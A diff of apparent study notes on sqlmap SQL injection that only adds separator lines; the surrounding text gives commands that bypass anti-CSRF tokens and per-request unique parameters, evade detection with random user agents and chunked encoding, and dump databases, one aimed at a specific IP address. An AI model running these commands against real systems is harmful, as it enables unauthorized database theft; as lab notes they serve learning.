@@ -55,7 +55,7 @@ ________________________________________________________________________________
 <img width="1440" height="549" alt="image" src="https://github.com/user-attachments/assets/33ab530c-c390-41ad-bb25-2b574076e90d" />
 <br>
 
-
+______________________________________________________________________________________________________________________________________________________________________
 # Anti-CSRF token Bypass
 
 req.txt file
@@ -64,13 +64,13 @@ req.txt file
 
 
 #sqlmap -r req.txt --csrf-token="t0ken" --batch --dump
-
+______________________________________________________________________________________________________________________________________________________________________
 # Unique parameter Bypass
 
 Each parameter is combined with unique parameter for protection, to bypass the unique parameter just the value called --randomize 
 
 #sqlmap -u "http://154.57.164.79:31524/case9.php?id=1&uid=26987434" --randomize=uid --batch --dump
-
+______________________________________________________________________________________________________________________________________________________________________
 # Using --random-agent in sqlmap
 
 #sqlmap -r req.txt -p email --level 5  --risk 3 --random-agent --chunked --dump
@@ -78,5 +78,5 @@ Each parameter is combined with unique parameter for protection, to bypass the u
 --random-agent: This option tells sqlmap to use a randomly selected HTTP User-Agent header for each request, which can help evade detection.
 
 --chunked: This option instructs sqlmap to use chunked encoding in HTTP requests. Chunked encoding can help bypass some security measures.
-
+______________________________________________________________________________________________________________________________________________________________________
 
